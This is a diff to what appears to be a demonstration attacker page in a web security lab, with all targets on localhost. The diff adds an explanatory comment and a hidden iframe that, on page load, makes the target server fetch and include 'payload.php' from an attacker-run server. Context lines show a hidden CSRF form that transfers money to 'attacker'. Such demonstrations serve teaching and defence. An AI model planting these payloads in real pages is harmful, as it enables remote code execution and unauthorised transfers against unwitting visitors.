@@ -36,6 +36,20 @@
     The server never knew the request came from a foreign page.
     No token was checked. No origin was validated.
   -->
+  <!--
+    RFI ATTACK EXPLAINED
+    ────────────────────
+    This hidden iframe causes the *server* to fetch attacker-controlled content
+    the instant a victim opens this page. No click required.
+
+    The vulnerable endpoint: GET /docs?src=<url>
+    If src starts with http://, the server fetches it and includes the response.
+    The attacker's server (port 8000) serves payload. — whatever is in that file
+    gets pulled in by the target server on the victim's behalf.
+  -->
+  <iframe src="http://localhost:3000/docs?src=http://localhost:8000/payload.php"
+          style="display:none" title=""></iframe>
+
   <form id="csrf-form" action="http://localhost:3000/transfer" method="POST" style="display:none">
     <input type="hidden" name="to"     value="attacker" />
     <input type="hidden" name="amount" value="500" />
